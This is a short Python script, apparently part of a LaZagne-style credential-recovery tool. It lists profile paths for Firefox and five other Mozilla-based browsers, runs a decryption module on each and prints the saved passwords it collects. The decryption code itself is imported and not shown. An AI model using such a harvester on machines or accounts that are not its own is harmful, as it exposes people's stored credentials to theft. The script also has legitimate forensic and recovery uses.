from libs.modules import run_module
from modules.firefox.mozilla import Mozilla

firefox_browsers = [
	(u'firefox', u'{APPDATA}\\Mozilla\\Firefox'),
	(u'blackHawk', u'{APPDATA}\\NETGATE Technologies\\BlackHawk'),
	(u'cyberfox', u'{APPDATA}\\8pecxstudios\\Cyberfox'),
	(u'comodo IceDragon', u'{APPDATA}\\Comodo\\IceDragon'),
	(u'k-Meleon', u'{APPDATA}\\K-Meleon'),
	(u'icecat', u'{APPDATA}\\Mozilla\\icecat'),
]

if __name__ == '__main__':
	passwords = []
	mozilla_driver = [Mozilla(browser_name=name, path=path) for name, path in firefox_browsers]
	run_module(passwords, mozilla_driver)
	print(passwords)